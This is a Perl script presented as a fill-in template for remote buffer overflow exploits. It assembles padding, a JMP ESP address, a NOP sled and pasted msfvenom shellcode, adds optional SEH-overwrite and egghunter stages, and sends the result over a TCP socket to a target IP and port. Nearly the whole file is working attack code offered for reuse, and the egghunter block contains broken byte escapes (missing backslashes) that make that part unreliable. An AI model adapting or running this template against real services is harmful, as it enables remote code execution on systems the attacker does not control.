#!/usr/bin/perl
# This file contains a template for buffer overflows
# Note: SEH and egghunter code is included so remove those blocks if not required
# 
# Header, DO NOT CHANGE
use IO::Socket;
if ($ARGV[1] eq '') {
	die("Usage: $0 IP_ADDRESS PORT\n\n");
}
 
# Payload details, change for every exploit
$payload = "A" x <byte offset>; # Append the payload offset found
$payload .= pack('V', <address>); # Your targeted executable’s JMP ESP memory address
$payload .= "\x90" x 16; # 16 NOPs optional
$payload .= <shellcode>; # Copy/paste msfvenom-generated shellcode here
 
# SEH Overflow Begin, situationally dependent
$payload .= "\x90" x (3498 - length($payload));
$payload .= "\xEB\x0F\x90\x90"; # JMP 0F, NOP, NOP
$payload .= pack('V', 0x625010B4); # SEH overwrite of your targeted executable’s POP EBX, POP EBP, RET
$payload .= "\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF";
$payload .= "\x90" x (4000 - length($payload)); # data after SEH handler
 
# Egghunter Overflow Begin, situationally dependent
$payload = "x90" x 20; # NOP sled
$payload .=  <shellcode>; # skape syscall egghunter searching for R0cX
$payload .= "x90" x (69 - length($payload));
$payload .= pack('V', 0x625011AF); # Your targeted executable’s JMP ESP memory address
$payload .= "x89xe0x83xe8x40xffxe0"; # mov eax, esp; sub eax, 0x40; jmp eax
 
# Footer, DO NOT CHANGE
$socket = IO::Socket::INET->new( # setup TCP socket – $socket
	Proto => "tcp",
	PeerAddr => "$ARGV[0]", # command line variable 1 – IP Address
	PeerPort => "$ARGV[1]" # command line variable 2 – TCP port
) or die "Cannot connect to $ARGV[0]:$ARGV[1]";
 
$socket->recv($sd, 1024); # Receive 1024 bytes data from $socket, store in $sd
print "$sd"; # print $sd variable
$socket->send($payload); # send $payload variable via $socket
